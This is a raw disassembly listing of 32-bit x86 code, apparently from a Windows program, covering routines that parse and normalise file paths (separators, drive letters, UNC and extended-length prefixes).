  40391e:	83 bc 24 24 20 00 00 	cmpl   $0x0,0x2024(%esp)
  403925:	00 
  403926:	76 05                	jbe    0x40392d
  403928:	33 c0                	xor    %eax,%eax
  40392a:	66 89 07             	mov    %ax,(%edi)
  40392d:	8b 8c 24 14 20 00 00 	mov    0x2014(%esp),%ecx
  403934:	5f                   	pop    %edi
  403935:	5e                   	pop    %esi
  403936:	5d                   	pop    %ebp
  403937:	5b                   	pop    %ebx
  403938:	33 cc                	xor    %esp,%ecx
  40393a:	e8 1a 2c 01 00       	call   0x416559
  40393f:	81 c4 08 20 00 00    	add    $0x2008,%esp
  403945:	c2 0c 00             	ret    $0xc
  403948:	b8 0c 10 00 00       	mov    $0x100c,%eax
  40394d:	e8 ae 2c 01 00       	call   0x416600
  403952:	a1 5c 56 43 00       	mov    0x43565c,%eax
  403957:	33 c4                	xor    %esp,%eax
  403959:	89 84 24 08 10 00 00 	mov    %eax,0x1008(%esp)
  403960:	53                   	push   %ebx
  403961:	8b 9c 24 18 10 00 00 	mov    0x1018(%esp),%ebx
  403968:	55                   	push   %ebp
  403969:	56                   	push   %esi
  40396a:	8b b4 24 1c 10 00 00 	mov    0x101c(%esp),%esi
  403971:	57                   	push   %edi
  403972:	6a 2e                	push   $0x2e
  403974:	89 74 24 14          	mov    %esi,0x14(%esp)
  403978:	0f b7 06             	movzwl (%esi),%eax
  40397b:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  40397f:	8b c8                	mov    %eax,%ecx
  403981:	5d                   	pop    %ebp
  403982:	66 85 c0             	test   %ax,%ax
  403985:	74 41                	je     0x4039c8
  403987:	8d 7e 04             	lea    0x4(%esi),%edi
  40398a:	0f b7 c1             	movzwl %cx,%eax
  40398d:	50                   	push   %eax
  40398e:	e8 20 05 00 00       	call   0x403eb3
  403993:	84 c0                	test   %al,%al
  403995:	74 1c                	je     0x4039b3
  403997:	66 39 6f fe          	cmp    %bp,-0x2(%edi)
  40399b:	75 16                	jne    0x4039b3
  40399d:	66 39 2f             	cmp    %bp,(%edi)
  4039a0:	75 11                	jne    0x4039b3
  4039a2:	0f b7 47 02          	movzwl 0x2(%edi),%eax
  4039a6:	50                   	push   %eax
  4039a7:	e8 07 05 00 00       	call   0x403eb3
  4039ac:	84 c0                	test   %al,%al
  4039ae:	74 03                	je     0x4039b3
  4039b0:	8d 77 04             	lea    0x4(%edi),%esi
  4039b3:	0f b7 47 fe          	movzwl -0x2(%edi),%eax
  4039b7:	83 c7 02             	add    $0x2,%edi
  4039ba:	8b c8                	mov    %eax,%ecx
  4039bc:	66 85 c0             	test   %ax,%ax
  4039bf:	75 c9                	jne    0x40398a
  4039c1:	0f b7 0e             	movzwl (%esi),%ecx
  4039c4:	89 74 24 10          	mov    %esi,0x10(%esp)
  4039c8:	33 d2                	xor    %edx,%edx
  4039ca:	66 85 c9             	test   %cx,%cx
  4039cd:	0f 84 c5 00 00 00    	je     0x403a98
  4039d3:	0f b7 0e             	movzwl (%esi),%ecx
  4039d6:	0f b7 c9             	movzwl %cx,%ecx
  4039d9:	8b fe                	mov    %esi,%edi
  4039db:	8b c1                	mov    %ecx,%eax
  4039dd:	66 85 c9             	test   %cx,%cx
  4039e0:	74 0d                	je     0x4039ef
  4039e2:	66 83 7e 02 3a       	cmpw   $0x3a,0x2(%esi)
  4039e7:	75 06                	jne    0x4039ef
  4039e9:	8d 7e 04             	lea    0x4(%esi),%edi
  4039ec:	0f b7 07             	movzwl (%edi),%eax
  4039ef:	0f b7 c0             	movzwl %ax,%eax
  4039f2:	50                   	push   %eax
  4039f3:	e8 bb 04 00 00       	call   0x403eb3
  4039f8:	84 c0                	test   %al,%al
  4039fa:	74 42                	je     0x403a3e
  4039fc:	0f b7 47 02          	movzwl 0x2(%edi),%eax
  403a00:	50                   	push   %eax
  403a01:	e8 ad 04 00 00       	call   0x403eb3
  403a06:	84 c0                	test   %al,%al
  403a08:	74 34                	je     0x403a3e
  403a0a:	8d 5f 04             	lea    0x4(%edi),%ebx
  403a0d:	33 ed                	xor    %ebp,%ebp
  403a0f:	0f b7 03             	movzwl (%ebx),%eax
  403a12:	66 85 c0             	test   %ax,%ax
  403a15:	74 27                	je     0x403a3e
  403a17:	8b c8                	mov    %eax,%ecx
  403a19:	0f b7 c1             	movzwl %cx,%eax
  403a1c:	50                   	push   %eax
  403a1d:	e8 91 04 00 00       	call   0x403eb3
  403a22:	84 c0                	test   %al,%al
  403a24:	74 06                	je     0x403a2c
  403a26:	45                   	inc    %ebp
  403a27:	83 fd 02             	cmp    $0x2,%ebp
  403a2a:	74 0f                	je     0x403a3b
  403a2c:	83 c3 02             	add    $0x2,%ebx
  403a2f:	0f b7 03             	movzwl (%ebx),%eax
  403a32:	8b c8                	mov    %eax,%ecx
  403a34:	66 85 c0             	test   %ax,%ax
  403a37:	75 e0                	jne    0x403a19
  403a39:	eb 03                	jmp    0x403a3e
  403a3b:	8d 7b 02             	lea    0x2(%ebx),%edi
  403a3e:	0f b7 07             	movzwl (%edi),%eax
  403a41:	8b df                	mov    %edi,%ebx
  403a43:	66 85 c0             	test   %ax,%ax
  403a46:	74 2f                	je     0x403a77
  403a48:	6a 2e                	push   $0x2e
  403a4a:	8b e8                	mov    %eax,%ebp
  403a4c:	5e                   	pop    %esi
  403a4d:	0f b7 c5             	movzwl %bp,%eax
  403a50:	50                   	push   %eax
  403a51:	e8 5d 04 00 00       	call   0x403eb3
  403a56:	84 c0                	test   %al,%al
  403a58:	74 07                	je     0x403a61
  403a5a:	8d 7b 02             	lea    0x2(%ebx),%edi
  403a5d:	8b df                	mov    %edi,%ebx
  403a5f:	eb 08                	jmp    0x403a69
  403a61:	66 3b ee             	cmp    %si,%bp
  403a64:	75 0d                	jne    0x403a73
  403a66:	83 c3 02             	add    $0x2,%ebx
  403a69:	0f b7 03             	movzwl (%ebx),%eax
  403a6c:	8b e8                	mov    %eax,%ebp
  403a6e:	66 85 c0             	test   %ax,%ax
  403a71:	75 da                	jne    0x403a4d
  403a73:	8b 74 24 10          	mov    0x10(%esp),%esi
  403a77:	3b fe                	cmp    %esi,%edi
  403a79:	74 14                	je     0x403a8f
  403a7b:	0f b7 07             	movzwl (%edi),%eax
  403a7e:	8b f7                	mov    %edi,%esi
  403a80:	89 74 24 10          	mov    %esi,0x10(%esp)
  403a84:	8b c8                	mov    %eax,%ecx
  403a86:	66 85 c0             	test   %ax,%ax
  403a89:	0f 85 47 ff ff ff    	jne    0x4039d6
  403a8f:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  403a93:	33 d2                	xor    %edx,%edx
  403a95:	6a 2e                	push   $0x2e
  403a97:	5d                   	pop    %ebp
  403a98:	66 39 2e             	cmp    %bp,(%esi)
  403a9b:	75 0f                	jne    0x403aac
  403a9d:	66 39 6e 02          	cmp    %bp,0x2(%esi)
  403aa1:	75 09                	jne    0x403aac
  403aa3:	66 39 56 04          	cmp    %dx,0x4(%esi)
  403aa7:	75 03                	jne    0x403aac
  403aa9:	83 c6 04             	add    $0x4,%esi
  403aac:	85 db                	test   %ebx,%ebx
  403aae:	74 22                	je     0x403ad2
  403ab0:	68 00 08 00 00       	push   $0x800
  403ab5:	56                   	push   %esi
  403ab6:	8d 44 24 20          	lea    0x20(%esp),%eax
  403aba:	50                   	push   %eax
  403abb:	e8 b7 35 00 00       	call   0x407077
  403ac0:	ff b4 24 28 10 00 00 	push   0x1028(%esp)
  403ac7:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  403acb:	50                   	push   %eax
  403acc:	53                   	push   %ebx
  403acd:	e8 a5 35 00 00       	call   0x407077
  403ad2:	8b 8c 24 18 10 00 00 	mov    0x1018(%esp),%ecx
  403ad9:	8b c6                	mov    %esi,%eax
  403adb:	5f                   	pop    %edi
  403adc:	5e                   	pop    %esi
  403add:	5d                   	pop    %ebp
  403ade:	5b                   	pop    %ebx
  403adf:	33 cc                	xor    %esp,%ecx
  403ae1:	e8 73 2a 01 00       	call   0x416559
  403ae6:	81 c4 0c 10 00 00    	add    $0x100c,%esp
  403aec:	c2 0c 00             	ret    $0xc
  403aef:	55                   	push   %ebp
  403af0:	8b ec                	mov    %esp,%ebp
  403af2:	b8 04 10 00 00       	mov    $0x1004,%eax
  403af7:	e8 04 2b 01 00       	call   0x416600
  403afc:	a1 5c 56 43 00       	mov    0x43565c,%eax
  403b01:	33 c5                	xor    %ebp,%eax
  403b03:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403b06:	56                   	push   %esi
  403b07:	8b 75 08             	mov    0x8(%ebp),%esi
  403b0a:	e8 a8 f8 ff ff       	call   0x4033b7
  403b0f:	3d 00 06 00 00       	cmp    $0x600,%eax
  403b14:	72 31                	jb     0x403b47
  403b16:	68 00 08 00 00       	push   $0x800
  403b1b:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  403b21:	50                   	push   %eax
  403b22:	6a ff                	push   $0xffffffff
  403b24:	56                   	push   %esi
  403b25:	6a 20                	push   $0x20
  403b27:	ff 15 68 a0 42 00    	call   *0x42a068
  403b2d:	85 c0                	test   %eax,%eax
  403b2f:	74 16                	je     0x403b47
  403b31:	ff 75 0c             	push   0xc(%ebp)
  403b34:	33 c0                	xor    %eax,%eax
  403b36:	66 89 45 fa          	mov    %ax,-0x6(%ebp)
  403b3a:	8d 85 fc ef ff ff    	lea    -0x1004(%ebp),%eax
  403b40:	50                   	push   %eax
  403b41:	56                   	push   %esi
  403b42:	e8 30 35 00 00       	call   0x407077
  403b47:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403b4a:	33 cd                	xor    %ebp,%ecx
  403b4c:	5e                   	pop    %esi
  403b4d:	e8 07 2a 01 00       	call   0x416559
  403b52:	c9                   	leave
  403b53:	c2 08 00             	ret    $0x8
  403b56:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  403b5b:	75 04                	jne    0x403b61
  403b5d:	33 c0                	xor    %eax,%eax
  403b5f:	eb 13                	jmp    0x403b74
  403b61:	ff 74 24 04          	push   0x4(%esp)
  403b65:	e8 bf 04 00 00       	call   0x404029
  403b6a:	6a 2e                	push   $0x2e
  403b6c:	50                   	push   %eax
  403b6d:	e8 4e 47 01 00       	call   0x4182c0
  403b72:	59                   	pop    %ecx
  403b73:	59                   	pop    %ecx
  403b74:	c2 04 00             	ret    $0x4
  403b77:	57                   	push   %edi
  403b78:	8b 7c 24 10          	mov    0x10(%esp),%edi
  403b7c:	85 ff                	test   %edi,%edi
  403b7e:	74 36                	je     0x403bb6
  403b80:	56                   	push   %esi
  403b81:	8b 74 24 0c          	mov    0xc(%esp),%esi
  403b85:	4f                   	dec    %edi
  403b86:	56                   	push   %esi
  403b87:	e8 9d 04 00 00       	call   0x404029
  403b8c:	2b c6                	sub    %esi,%eax
  403b8e:	d1 f8                	sar    $1,%eax
  403b90:	3b f8                	cmp    %eax,%edi
  403b92:	72 0c                	jb     0x403ba0
  403b94:	56                   	push   %esi
  403b95:	e8 8f 04 00 00       	call   0x404029
  403b9a:	8b f8                	mov    %eax,%edi
  403b9c:	2b fe                	sub    %esi,%edi
  403b9e:	d1 ff                	sar    $1,%edi
  403ba0:	57                   	push   %edi
  403ba1:	56                   	push   %esi
  403ba2:	8b 74 24 18          	mov    0x18(%esp),%esi
  403ba6:	56                   	push   %esi
  403ba7:	e8 59 9a 01 00       	call   0x41d605
  403bac:	83 c4 0c             	add    $0xc,%esp
  403baf:	33 c0                	xor    %eax,%eax
  403bb1:	66 89 04 7e          	mov    %ax,(%esi,%edi,2)
  403bb5:	5e                   	pop    %esi
  403bb6:	5f                   	pop    %edi
  403bb7:	c2 0c 00             	ret    $0xc
  403bba:	53                   	push   %ebx
  403bbb:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403bbf:	33 c0                	xor    %eax,%eax
  403bc1:	57                   	push   %edi
  403bc2:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403bc6:	57                   	push   %edi
  403bc7:	66 89 03             	mov    %ax,(%ebx)
  403bca:	e8 84 02 00 00       	call   0x403e53
  403bcf:	0f b7 0f             	movzwl (%edi),%ecx
  403bd2:	84 c0                	test   %al,%al
  403bd4:	74 15                	je     0x403beb
  403bd6:	51                   	push   %ecx
  403bd7:	68 18 a6 42 00       	push   $0x42a618
  403bdc:	ff 74 24 1c          	push   0x1c(%esp)
  403be0:	53                   	push   %ebx
  403be1:	e8 d7 f4 ff ff       	call   0x4030bd
  403be6:	83 c4 10             	add    $0x10,%esp
  403be9:	eb 57                	jmp    0x403c42
  403beb:	56                   	push   %esi
  403bec:	6a 5c                	push   $0x5c
  403bee:	5e                   	pop    %esi
  403bef:	66 3b ce             	cmp    %si,%cx
  403bf2:	75 4d                	jne    0x403c41
  403bf4:	66 39 77 02          	cmp    %si,0x2(%edi)
  403bf8:	75 47                	jne    0x403c41
  403bfa:	8d 47 04             	lea    0x4(%edi),%eax
  403bfd:	56                   	push   %esi
  403bfe:	50                   	push   %eax
  403bff:	e8 9c 3f 01 00       	call   0x417ba0
  403c04:	59                   	pop    %ecx
  403c05:	59                   	pop    %ecx
  403c06:	85 c0                	test   %eax,%eax
  403c08:	74 37                	je     0x403c41
  403c0a:	83 c0 02             	add    $0x2,%eax
  403c0d:	56                   	push   %esi
  403c0e:	50                   	push   %eax
  403c0f:	e8 8c 3f 01 00       	call   0x417ba0
  403c14:	59                   	pop    %ecx
  403c15:	59                   	pop    %ecx
  403c16:	85 c0                	test   %eax,%eax
  403c18:	74 07                	je     0x403c21
  403c1a:	2b c7                	sub    %edi,%eax
  403c1c:	d1 f8                	sar    $1,%eax
  403c1e:	40                   	inc    %eax
  403c1f:	eb 07                	jmp    0x403c28
  403c21:	57                   	push   %edi
  403c22:	e8 0c 76 01 00       	call   0x41b233
  403c27:	59                   	pop    %ecx
  403c28:	3b 44 24 18          	cmp    0x18(%esp),%eax
  403c2c:	1b f6                	sbb    %esi,%esi
  403c2e:	23 f0                	and    %eax,%esi
  403c30:	56                   	push   %esi
  403c31:	57                   	push   %edi
  403c32:	53                   	push   %ebx
  403c33:	e8 cd 99 01 00       	call   0x41d605
  403c38:	83 c4 0c             	add    $0xc,%esp
  403c3b:	33 c0                	xor    %eax,%eax
  403c3d:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  403c41:	5e                   	pop    %esi
  403c42:	5f                   	pop    %edi
  403c43:	5b                   	pop    %ebx
  403c44:	c2 0c 00             	ret    $0xc
  403c47:	55                   	push   %ebp
  403c48:	8b ec                	mov    %esp,%ebp
  403c4a:	8b 45 0c             	mov    0xc(%ebp),%eax
  403c4d:	56                   	push   %esi
  403c4e:	57                   	push   %edi
  403c4f:	8b 7d 14             	mov    0x14(%ebp),%edi
  403c52:	85 c0                	test   %eax,%eax
  403c54:	74 1a                	je     0x403c70
  403c56:	66 83 38 00          	cmpw   $0x0,(%eax)
  403c5a:	74 14                	je     0x403c70
  403c5c:	8b 75 10             	mov    0x10(%ebp),%esi
  403c5f:	3b f0                	cmp    %eax,%esi
  403c61:	74 27                	je     0x403c8a
  403c63:	57                   	push   %edi
  403c64:	50                   	push   %eax
  403c65:	56                   	push   %esi
  403c66:	e8 9a 99 01 00       	call   0x41d605
  403c6b:	83 c4 0c             	add    $0xc,%esp
  403c6e:	eb 1a                	jmp    0x403c8a
  403c70:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403c74:	8b 75 10             	mov    0x10(%ebp),%esi
  403c77:	74 0c                	je     0x403c85
  403c79:	57                   	push   %edi
  403c7a:	56                   	push   %esi
  403c7b:	ff 75 08             	push   0x8(%ebp)
  403c7e:	e8 8e 44 00 00       	call   0x408111
  403c83:	eb 05                	jmp    0x403c8a
  403c85:	33 c0                	xor    %eax,%eax
  403c87:	66 89 06             	mov    %ax,(%esi)
  403c8a:	85 ff                	test   %edi,%edi
  403c8c:	74 07                	je     0x403c95
  403c8e:	33 c0                	xor    %eax,%eax
  403c90:	66 89 44 7e fe       	mov    %ax,-0x2(%esi,%edi,2)
  403c95:	5f                   	pop    %edi
  403c96:	8b c6                	mov    %esi,%eax
  403c98:	5e                   	pop    %esi
  403c99:	5d                   	pop    %ebp
  403c9a:	c2 10 00             	ret    $0x10
  403c9d:	b8 04 10 00 00       	mov    $0x1004,%eax
  403ca2:	e8 59 29 01 00       	call   0x416600
  403ca7:	a1 5c 56 43 00       	mov    0x43565c,%eax
  403cac:	33 c4                	xor    %esp,%eax
  403cae:	89 84 24 00 10 00 00 	mov    %eax,0x1000(%esp)
  403cb5:	53                   	push   %ebx
  403cb6:	55                   	push   %ebp
  403cb7:	56                   	push   %esi
  403cb8:	8b b4 24 14 10 00 00 	mov    0x1014(%esp),%esi
  403cbf:	57                   	push   %edi
  403cc0:	8b bc 24 1c 10 00 00 	mov    0x101c(%esp),%edi
  403cc7:	66 83 3e 00          	cmpw   $0x0,(%esi)
  403ccb:	0f 84 65 01 00 00    	je     0x403e36
  403cd1:	56                   	push   %esi
  403cd2:	e8 7c 01 00 00       	call   0x403e53
  403cd7:	56                   	push   %esi
  403cd8:	e8 56 75 01 00       	call   0x41b233
  403cdd:	59                   	pop    %ecx
  403cde:	56                   	push   %esi
  403cdf:	8b d8                	mov    %eax,%ebx
  403ce1:	e8 98 01 00 00       	call   0x403e7e
  403ce6:	84 c0                	test   %al,%al
  403ce8:	0f 84 88 00 00 00    	je     0x403d76
  403cee:	56                   	push   %esi
  403cef:	e8 5f 01 00 00       	call   0x403e53
  403cf4:	84 c0                	test   %al,%al
  403cf6:	74 37                	je     0x403d2f
  403cf8:	8d 43 04             	lea    0x4(%ebx),%eax
  403cfb:	39 84 24 20 10 00 00 	cmp    %eax,0x1020(%esp)
  403d02:	0f 86 2e 01 00 00    	jbe    0x403e36
  403d08:	ff b4 24 20 10 00 00 	push   0x1020(%esp)
  403d0f:	68 24 a6 42 00       	push   $0x42a624
  403d14:	57                   	push   %edi
  403d15:	e8 5d 33 00 00       	call   0x407077
  403d1a:	ff b4 24 20 10 00 00 	push   0x1020(%esp)
  403d21:	56                   	push   %esi
  403d22:	57                   	push   %edi
  403d23:	e8 27 33 00 00       	call   0x40704f
  403d28:	b0 01                	mov    $0x1,%al
  403d2a:	e9 09 01 00 00       	jmp    0x403e38
  403d2f:	6a 5c                	push   $0x5c
  403d31:	58                   	pop    %eax
  403d32:	66 39 06             	cmp    %ax,(%esi)
  403d35:	0f 85 fb 00 00 00    	jne    0x403e36
  403d3b:	8d 6e 02             	lea    0x2(%esi),%ebp
  403d3e:	66 39 45 00          	cmp    %ax,0x0(%ebp)
  403d42:	0f 85 ee 00 00 00    	jne    0x403e36
  403d48:	8b b4 24 20 10 00 00 	mov    0x1020(%esp),%esi
  403d4f:	8d 43 06             	lea    0x6(%ebx),%eax
  403d52:	3b f0                	cmp    %eax,%esi
  403d54:	0f 86 dc 00 00 00    	jbe    0x403e36
  403d5a:	56                   	push   %esi
  403d5b:	68 24 a6 42 00       	push   $0x42a624
  403d60:	57                   	push   %edi
  403d61:	e8 11 33 00 00       	call   0x407077
  403d66:	56                   	push   %esi
  403d67:	68 30 a6 42 00       	push   $0x42a630
  403d6c:	57                   	push   %edi
  403d6d:	e8 dd 32 00 00       	call   0x40704f
  403d72:	56                   	push   %esi
  403d73:	55                   	push   %ebp
  403d74:	eb ac                	jmp    0x403d22
  403d76:	8d 44 24 10          	lea    0x10(%esp),%eax
  403d7a:	bd ff 07 00 00       	mov    $0x7ff,%ebp
  403d7f:	50                   	push   %eax
  403d80:	55                   	push   %ebp
  403d81:	ff 15 60 a0 42 00    	call   *0x42a060
  403d87:	85 c0                	test   %eax,%eax
  403d89:	0f 84 a7 00 00 00    	je     0x403e36
  403d8f:	3b c5                	cmp    %ebp,%eax
  403d91:	0f 87 9f 00 00 00    	ja     0x403e36
  403d97:	0f b7 06             	movzwl (%esi),%eax
  403d9a:	50                   	push   %eax
  403d9b:	e8 13 01 00 00       	call   0x403eb3
  403da0:	84 c0                	test   %al,%al
  403da2:	74 37                	je     0x403ddb
  403da4:	8d 43 06             	lea    0x6(%ebx),%eax
  403da7:	8b 9c 24 20 10 00 00 	mov    0x1020(%esp),%ebx
  403dae:	3b d8                	cmp    %eax,%ebx
  403db0:	0f 86 80 00 00 00    	jbe    0x403e36
  403db6:	53                   	push   %ebx
  403db7:	68 24 a6 42 00       	push   $0x42a624
  403dbc:	57                   	push   %edi
  403dbd:	e8 b5 32 00 00       	call   0x407077
  403dc2:	33 c0                	xor    %eax,%eax
  403dc4:	66 89 44 24 14       	mov    %ax,0x14(%esp)
  403dc9:	8d 44 24 10          	lea    0x10(%esp),%eax
  403dcd:	53                   	push   %ebx
  403dce:	50                   	push   %eax
  403dcf:	57                   	push   %edi
  403dd0:	e8 7a 32 00 00       	call   0x40704f
  403dd5:	53                   	push   %ebx
  403dd6:	e9 46 ff ff ff       	jmp    0x403d21
  403ddb:	68 00 08 00 00       	push   $0x800
  403de0:	8d 44 24 14          	lea    0x14(%esp),%eax
  403de4:	50                   	push   %eax
  403de5:	e8 53 fa ff ff       	call   0x40383d
  403dea:	8d 44 24 10          	lea    0x10(%esp),%eax
  403dee:	50                   	push   %eax
  403def:	e8 3f 74 01 00       	call   0x41b233
  403df4:	83 c3 04             	add    $0x4,%ebx
  403df7:	03 c3                	add    %ebx,%eax
  403df9:	8b 9c 24 24 10 00 00 	mov    0x1024(%esp),%ebx
  403e00:	59                   	pop    %ecx
  403e01:	3b d8                	cmp    %eax,%ebx
  403e03:	76 31                	jbe    0x403e36
  403e05:	53                   	push   %ebx
  403e06:	68 24 a6 42 00       	push   $0x42a624
  403e0b:	57                   	push   %edi
  403e0c:	e8 66 32 00 00       	call   0x407077
  403e11:	53                   	push   %ebx
  403e12:	8d 44 24 14          	lea    0x14(%esp),%eax
  403e16:	50                   	push   %eax
  403e17:	57                   	push   %edi
  403e18:	e8 32 32 00 00       	call   0x40704f
  403e1d:	66 83 3e 2e          	cmpw   $0x2e,(%esi)
  403e21:	75 b2                	jne    0x403dd5
  403e23:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  403e27:	50                   	push   %eax
  403e28:	e8 86 00 00 00       	call   0x403eb3
  403e2d:	84 c0                	test   %al,%al
  403e2f:	74 a4                	je     0x403dd5
  403e31:	83 c6 04             	add    $0x4,%esi
  403e34:	eb 9f                	jmp    0x403dd5
  403e36:	32 c0                	xor    %al,%al
  403e38:	8b 8c 24 10 10 00 00 	mov    0x1010(%esp),%ecx
  403e3f:	5f                   	pop    %edi
  403e40:	5e                   	pop    %esi
  403e41:	5d                   	pop    %ebp
  403e42:	5b                   	pop    %ebx
  403e43:	33 cc                	xor    %esp,%ecx
  403e45:	e8 0f 27 01 00       	call   0x416559
  403e4a:	81 c4 04 10 00 00    	add    $0x1004,%esp
  403e50:	c2 0c 00             	ret    $0xc
  403e53:	56                   	push   %esi
  403e54:	8b 74 24 08          	mov    0x8(%esp),%esi
  403e58:	0f b7 06             	movzwl (%esi),%eax
  403e5b:	50                   	push   %eax
  403e5c:	e8 94 30 00 00       	call   0x406ef5
  403e61:	0f b7 c0             	movzwl %ax,%eax
  403e64:	83 c0 bf             	add    $0xffffffbf,%eax
  403e67:	66 83 f8 19          	cmp    $0x19,%ax
  403e6b:	77 0b                	ja     0x403e78
  403e6d:	66 83 7e 02 3a       	cmpw   $0x3a,0x2(%esi)
  403e72:	75 04                	jne    0x403e78
  403e74:	b0 01                	mov    $0x1,%al
  403e76:	eb 02                	jmp    0x403e7a
  403e78:	32 c0                	xor    %al,%al
  403e7a:	5e                   	pop    %esi
  403e7b:	c2 04 00             	ret    $0x4
  403e7e:	56                   	push   %esi
  403e7f:	8b 74 24 08          	mov    0x8(%esp),%esi
  403e83:	6a 5c                	push   $0x5c
  403e85:	58                   	pop    %eax
  403e86:	66 39 06             	cmp    %ax,(%esi)
  403e89:	75 06                	jne    0x403e91
  403e8b:	66 39 46 02          	cmp    %ax,0x2(%esi)
  403e8f:	74 18                	je     0x403ea9
  403e91:	56                   	push   %esi
  403e92:	e8 bc ff ff ff       	call   0x403e53
  403e97:	84 c0                	test   %al,%al
  403e99:	74 12                	je     0x403ead
  403e9b:	0f b7 46 04          	movzwl 0x4(%esi),%eax
  403e9f:	50                   	push   %eax
  403ea0:	e8 0e 00 00 00       	call   0x403eb3
  403ea5:	84 c0                	test   %al,%al
  403ea7:	74 04                	je     0x403ead
  403ea9:	b0 01                	mov    $0x1,%al
  403eab:	eb 02                	jmp    0x403eaf
  403ead:	32 c0                	xor    %al,%al
  403eaf:	5e                   	pop    %esi
  403eb0:	c2 04 00             	ret    $0x4
  403eb3:	83 7c 24 04 5c       	cmpl   $0x5c,0x4(%esp)
  403eb8:	74 0b                	je     0x403ec5
  403eba:	83 7c 24 04 2f       	cmpl   $0x2f,0x4(%esp)
  403ebf:	74 04                	je     0x403ec5
  403ec1:	32 c0                	xor    %al,%al
  403ec3:	eb 02                	jmp    0x403ec7
  403ec5:	b0 01                	mov    $0x1,%al
  403ec7:	c2 04 00             	ret    $0x4
  403eca:	8b 44 24 04          	mov    0x4(%esp),%eax
  403ece:	85 c0                	test   %eax,%eax
  403ed0:	75 04                	jne    0x403ed6
  403ed2:	32 c0                	xor    %al,%al
  403ed4:	eb 30                	jmp    0x403f06
  403ed6:	6a 5c                	push   $0x5c
  403ed8:	59                   	pop    %ecx
  403ed9:	66 39 08             	cmp    %cx,(%eax)
  403edc:	75 16                	jne    0x403ef4
  403ede:	66 39 48 02          	cmp    %cx,0x2(%eax)
  403ee2:	75 10                	jne    0x403ef4
  403ee4:	66 83 78 04 3f       	cmpw   $0x3f,0x4(%eax)
  403ee9:	75 09                	jne    0x403ef4
  403eeb:	66 39 48 06          	cmp    %cx,0x6(%eax)
  403eef:	75 03                	jne    0x403ef4
  403ef1:	83 c0 08             	add    $0x8,%eax
  403ef4:	68 ec a5 42 00       	push   $0x42a5ec
  403ef9:	50                   	push   %eax
  403efa:	e8 49 97 01 00       	call   0x41d648
  403eff:	85 c0                	test   %eax,%eax
  403f01:	59                   	pop    %ecx
  403f02:	59                   	pop    %ecx
  403f03:	0f 95 c0             	setne  %al
  403f06:	c2 04 00             	ret    $0x4
  403f09:	b8 04 10 00 00       	mov    $0x1004,%eax
  403f0e:	e8 ed 26 01 00       	call   0x416600
  403f13:	a1 5c 56 43 00       	mov    0x43565c,%eax
  403f18:	33 c4                	xor    %esp,%eax
  403f1a:	89 84 24 00 10 00 00 	mov    %eax,0x1000(%esp)
  403f21:	53                   	push   %ebx
  403f22:	8b 9c 24 14 10 00 00 	mov    0x1014(%esp),%ebx
  403f29:	8d 44 24 04          	lea    0x4(%esp),%eax
  403f2d:	55                   	push   %ebp
  403f2e:	56                   	push   %esi
  403f2f:	8b b4 24 14 10 00 00 	mov    0x1014(%esp),%esi
  403f36:	bd 00 08 00 00       	mov    $0x800,%ebp
  403f3b:	57                   	push   %edi
  403f3c:	8b bc 24 1c 10 00 00 	mov    0x101c(%esp),%edi
  403f43:	55                   	push   %ebp
  403f44:	56                   	push   %esi
  403f45:	50                   	push   %eax
  403f46:	e8 2c 31 00 00       	call   0x407077
  403f4b:	56                   	push   %esi
  403f4c:	e8 02 ff ff ff       	call   0x403e53
  403f51:	84 c0                	test   %al,%al
  403f53:	74 07                	je     0x403f5c
  403f55:	66 83 7e 04 00       	cmpw   $0x0,0x4(%esi)
  403f5a:	74 0b                	je     0x403f67
  403f5c:	55                   	push   %ebp
  403f5d:	8d 44 24 14          	lea    0x14(%esp),%eax
  403f61:	50                   	push   %eax
  403f62:	e8 d6 f8 ff ff       	call   0x40383d
  403f67:	55                   	push   %ebp
  403f68:	57                   	push   %edi
  403f69:	8d 44 24 18          	lea    0x18(%esp),%eax
  403f6d:	50                   	push   %eax
  403f6e:	e8 dc 30 00 00       	call   0x40704f
  403f73:	ff b4 24 24 10 00 00 	push   0x1024(%esp)
  403f7a:	8d 44 24 14          	lea    0x14(%esp),%eax
  403f7e:	50                   	push   %eax
  403f7f:	53                   	push   %ebx
  403f80:	e8 f2 30 00 00       	call   0x407077
  403f85:	8b 8c 24 10 10 00 00 	mov    0x1010(%esp),%ecx
  403f8c:	5f                   	pop    %edi
  403f8d:	5e                   	pop    %esi
  403f8e:	5d                   	pop    %ebp
  403f8f:	5b                   	pop    %ebx
  403f90:	33 cc                	xor    %esp,%ecx
  403f92:	e8 c2 25 01 00       	call   0x416559
  403f97:	81 c4 04 10 00 00    	add    $0x1004,%esp
  403f9d:	c2 10 00             	ret    $0x10
  403fa0:	55                   	push   %ebp
  403fa1:	56                   	push   %esi
  403fa2:	8b 74 24 0c          	mov    0xc(%esp),%esi
  403fa6:	33 ed                	xor    %ebp,%ebp
  403fa8:	66 39 2e             	cmp    %bp,(%esi)
  403fab:	74 5b                	je     0x404008
  403fad:	53                   	push   %ebx
  403fae:	8a 5c 24 14          	mov    0x14(%esp),%bl
  403fb2:	57                   	push   %edi
  403fb3:	8b fd                	mov    %ebp,%edi
  403fb5:	b9 00 a6 42 00       	mov    $0x42a600,%ecx
  403fba:	84 db                	test   %bl,%bl
  403fbc:	75 05                	jne    0x403fc3
  403fbe:	b9 10 a6 42 00       	mov    $0x42a610,%ecx
  403fc3:	0f b7 06             	movzwl (%esi),%eax
  403fc6:	50                   	push   %eax
  403fc7:	51                   	push   %ecx
  403fc8:	e8 d3 3b 01 00       	call   0x417ba0
  403fcd:	59                   	pop    %ecx
  403fce:	59                   	pop    %ecx
  403fcf:	85 c0                	test   %eax,%eax
  403fd1:	75 0a                	jne    0x403fdd
  403fd3:	84 db                	test   %bl,%bl
  403fd5:	74 0e                	je     0x403fe5
  403fd7:	66 83 3e 20          	cmpw   $0x20,(%esi)
  403fdb:	73 08                	jae    0x403fe5
